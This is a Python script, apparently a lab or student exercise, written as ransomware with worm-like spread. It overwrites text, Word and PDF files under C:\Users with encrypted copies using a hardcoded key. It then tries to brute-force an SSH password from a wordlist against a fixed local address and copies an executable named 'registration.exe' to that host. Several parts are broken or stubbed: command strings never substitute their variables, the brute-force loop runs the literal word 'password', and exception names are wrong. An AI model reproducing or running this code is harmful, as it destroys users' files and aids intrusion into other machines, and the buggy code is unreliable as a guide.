from cryptography.fernet import Fernet
import os
#from pexpect import pxssh
import time

### VARIABLES ###
start_path = r"C:\Users"
key = "_TjtaRpjApz2rBn4m22iqH6x3wo_3iDE99HQwKwKt4o="
# initialize the Fernet class
f = Fernet(key)
### FUNCTIONS ###

#Traverse directory tree and encrypt all files
def encrypt():
    for (root, dirs, files) in os.walk(start_path, topdown = False):
        for name in files:
            path = os.path.join(root, name)
            if (path[-4:] == ".txt"):
                try:
                    encrypt_file(path, key)
                except:
                    pass
            elif (path[-4:] == ".doc"):
                encrypt_file(path, key)
            if (path[-4:] == ".pdf"):
                encrypt_file(path, key)
            elif (path[-5:] == ".docx"):
                encrypt_file(path, key)

def encrypt_file(filename, key):
    """
    Given a filename (str) and key (bytes), it encrypts the file and writes it
    """
    with open(filename, "rb") as file:
        # read all file data
        file_data = file.read()
    # encrypt data
    encrypting_data = f.encrypt(file_data)
    #Write over the existing file
    with open(filename, "wb") as file:
        file.write(encrypting_data)

# Transfer
def transferFiles(user, ipAddress, password):
    #badfile = r"C:\Users\IEUser\Downloads\registration.exe" #local machine
    dest = r":~\C:\Users\IEUser\Downloads\registration.exe"
    #os.system(scp badFile rf"{user}@{ipAddress}{dest}") #transfer to remote machine
    os.system('scp "registration.exe" rf"{user}@{ipAddress}{dest}"')
    #execute the file
    '''
    try:
        s=pxssh.pxssh()
        s.login(ipAddress, user, password)
        s.sendline('cd Downloads')
        s.sendline(registration.exe)
    except pxssh.Exception.Pxssh as e:
        time.sleep(1)
    '''

def sniffNetwork():
    #ipAddress='192.168.29.141'
    ipAddress = '192.168.1.40'
    #sniff
    return ipAddress

# try password list to get the admin SSH password
def bruteForce(user, ipAddress):
    filepath =open("passwordlist.txt", "r", errors='ignore')
    for i in filepath.readlines():
        password=i.strip("\n")
        #s=pxssh.pxssh()
        try:
            os.system('ssh rf"{user}@{ipAddress}"')
            time.sleep(1)
            os.system('password')
            #s.login(ipAddress, user, password)
            return password
            break
        except pxssh.ExceptionPxssh as e:
            time.sleep(1)

def main():
    encrypt()
    user = "IEUser"
    ipAddress = sniffNetwork()
    password = bruteForce(user, ipAddress)
    transferFiles(user, ipAddress, password)

### MAIN ###
main()
### END ###
